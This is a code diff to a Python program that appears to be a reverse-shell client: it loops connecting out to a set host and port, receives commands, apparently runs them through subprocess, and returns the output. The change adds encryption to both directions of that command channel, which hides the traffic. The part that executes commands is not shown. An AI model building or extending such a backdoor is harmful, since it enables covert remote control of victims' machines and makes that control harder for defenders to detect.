@@ -7,6 +7,7 @@ import socket
 import subprocess as sp
 from urllib.request import urlopen
 from common import pr, Send, Receive
+from cipher import get_cipher, key, iv
 
 HOST = '127.0.0.1'
 PORT = 1000
@@ -57,8 +58,11 @@ while True:
     sock = socket.socket()
     sock.connect((HOST, PORT))
 
+    cipher = get_cipher(key, iv)
+    decipher = get_cipher(key, iv)
+
     while True:
-      data = Receive(sock)
+      data = Receive(sock, decipher)
 
       if not data:
         sock.close()
@@ -80,7 +84,7 @@ while True:
         except Exception as e:
           ret = str(e) + ' ⚠️'     
        
-      Send(sock, cwd(ret))
+      Send(sock, cipher, cwd(ret))
 
   except socket.error:
     sock.close()
